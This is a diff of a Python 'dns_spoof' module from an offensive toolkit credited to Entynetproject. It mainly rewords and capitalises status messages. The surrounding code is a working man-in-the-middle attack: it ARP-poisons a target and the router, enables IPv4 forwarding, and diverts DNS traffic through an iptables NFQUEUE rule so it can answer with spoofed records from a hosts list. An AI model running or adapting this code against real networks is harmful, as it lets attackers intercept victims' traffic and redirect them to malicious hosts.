@@ -19,7 +19,7 @@ except:
 conf = {
 	"name": "dns_spoof",
 	"version": "2.0",
-	"shortdesc": "DNS spoof.",
+	"shortdesc": "Network targets DNS spoofer.",
 	"author": "Entynetproject",
 	"initdate": "29.4.2016",
 	"lastmod": "31.12.2016",
@@ -31,16 +31,16 @@ conf = {
 
 # List of the variables
 variables = OrderedDict((
-	('target', ['192.168.1.2', 'Target address.']),
-	('router', ['192.168.1.1', 'Router address.']),
-	("arp_spoof", ["true", "Arp spoof [true/false]."])
+	('target', ['192.168.1.2', 'Target IP address.']),
+	('router', ['192.168.1.1', 'Router IP address.']),
+	("arp_spoof", ["true", "Enable ARP spoof."])
 ))
 
 # Additional notes to options
 option_notes = colors.red+'Remember to edit hostlist:\n'+getpath.conf()+"hosts"+colors.end
 
 customcommands = {
-	'stop': 'End DNS spoof.'
+	'stop': 'Stop DNS spoof.'
 }
 
 #simple changelog
@@ -101,7 +101,7 @@ class ArpSpoofer(threading.Thread):
 				printInfo("Trying again...")
 				tried =+ 1
 				self.run()
-			printInfo("giving up...")
+			printInfo("Giving up...")
 			self.controller.error = "[err] Could not find victim MAC address!"
 			self.controller.kill = True
 
@@ -109,7 +109,7 @@ class ArpSpoofer(threading.Thread):
 			if self.controller.kill == True:
 				self.restore(self.router, self.victim, routerMAC, victimMAC)
 				os.system('echo "0" >> /proc/sys/net/ipv4/ip_forward')
-				printInfo("Arp spoofing ended.")
+				printInfo("ARP spoofing stopped.")
 				return
 			self.poison(self.router, self.victim, routerMAC, victimMAC)
 			time.sleep(1.5)
@@ -149,7 +149,7 @@ def run():
 		return
 
 	controller.reset()
-	printInfo("loading host list...")
+	printInfo("Loading host list...")
 	try:
 		hostfile = open(getpath.conf()+"hosts", "r").read()
 	except FileNotFoundError:
@@ -172,13 +172,13 @@ def run():
 			pass
 
 	if variables["arp_spoof"][0] == "true":
-		printInfo("ipv4 forwarding...")
+		printInfo("IPv4 forwarding...")
 		os.system('echo "1" >> /proc/sys/net/ipv4/ip_forward')
-		printInfo("starting arp spoof...")
+		printInfo("Starting arp spoof...")
 		arpspoof = ArpSpoofer(variables["router"][0], variables["target"][0], controller)
 		arpspoof.start()
 
-	printInfo("ctrl + c to end")
+	printInfo("Ctrl + C to stop.")
 	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
 	try:
 		q = NetfilterQueue()
@@ -192,10 +192,10 @@ def run():
 			os.system('iptables -X')
 			printInfo("dns spoof ended")
 	except:
-		printError("unexcepted error:\n")
+		printError("Unexcepted error:\n")
 		traceback.print_exc(file=sys.stdout)
 		controller.kill = True
 
 	if variables["arp_spoof"][0] == "true":
-		printInfo("stopping arp spoof")
+		printInfo("Stopping ARP spoof...")
 		arpspoof.join()
